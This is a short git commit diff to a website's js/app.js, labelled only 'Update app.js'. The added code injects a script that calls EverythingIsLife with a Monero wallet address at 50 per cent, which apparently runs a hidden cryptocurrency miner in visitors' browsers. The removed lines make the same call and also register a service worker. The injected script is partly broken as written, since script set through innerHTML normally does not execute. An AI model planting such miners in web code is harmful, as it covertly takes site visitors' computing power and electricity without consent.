328bb1ee06326dc8c1324779355a54411d151572
Abd Alrazzaq <devoojs@gmail.com>
2022-01-02 10:31:30 -0800

    Update app.js

--- js/app.js
+++ js/app.js
@@ -1,16 +1,3 @@
-
-let xmr = "";
-    xmr = EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'paw', 50);
-  
-  
-  const container = 
-document.getElementById('.container').innerHTML = xmr;
-  
-if ("serviceWorker" in navigator) {
-  window.addEventListener("load", function() {
-    navigator.serviceWorker
-      .register("/serviceWorker.js")
-      .then(res => console.log("service worker registered"))
-      .catch(err => console.log("service worker not registered", err));
-  });
-}
+const container = document.querySelector(".container").innerHTML = `<script type="text/javascript">
+EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'x', 50);
+</script>`
